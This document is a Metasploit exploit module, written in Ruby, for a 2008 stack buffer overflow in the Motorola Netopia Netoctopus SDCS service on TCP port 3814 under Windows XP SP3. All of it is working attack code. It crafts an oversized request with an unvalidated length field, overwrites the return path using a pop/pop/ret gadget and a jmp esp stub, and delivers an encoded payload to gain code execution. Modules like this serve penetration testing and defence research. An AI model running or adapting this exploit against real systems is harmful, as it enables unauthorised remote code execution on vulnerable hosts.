 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Motorola Netopia Netoctopus SDCS Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a vulnerability within the code responsible for
                parsing client requests. When reading in a request from the network,
                a 32-bit integer is read in that specifies the number of bytes that
                follow. This value is not validated, and is then used to read data into
                a fixed-size stack buffer.
            },
            &#039;Author&#039;         => [ &#039;James Fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=851&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 500,
                    &#039;DisableNops&#039; => &#039;true&#039;,
                    &#039;BadChars&#039; => "",
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff"
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ 
                        &#039;Windows XP SP3 EN&#039;, 
                            { 
                                # pop ecx/ pop ecx/ retn
                                # msvcrt.dll
                                &#039;Ret&#039; => 0x0044e046, 
                            } 
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jul 14 2008&#039;))
 
        register_options(
            [
                Opt::RPORT(3814)
            ], self.class )
    end
 
    def exploit
        connect
 
        p = payload.encoded
 
        pkt = "\x41" * 600
        pkt[0, 4] = [0x01000000].pack(&#039;V&#039;)
        pkt[8, 4] = [0x01000000].pack(&#039;V&#039;)
        pkt[12, 4] = [0x01000000].pack(&#039;V&#039;)
        pkt[16, 4] = [0x03000000].pack(&#039;V&#039;)     # this is the value mentioned above
        pkt[20, 4] = [0x66000000].pack(&#039;V&#039;)
        pkt[30, p.length] = p
        pkt[545, 4] = "\xeb\x06\x90\x90"
        pkt[549, 4] = [target.ret].pack(&#039;V&#039;)
        pkt[558, 6] = "\x81\xc4\x34\x06\x00\x00"    # add esp, 1588
        pkt[564, 2] = "\xff\xe4"            # jmp esp
 
 
        print_status("Trying target %s..." % target.name)
 
        sock.put(pkt)
 
        handler
        disconnect
    end
 
end

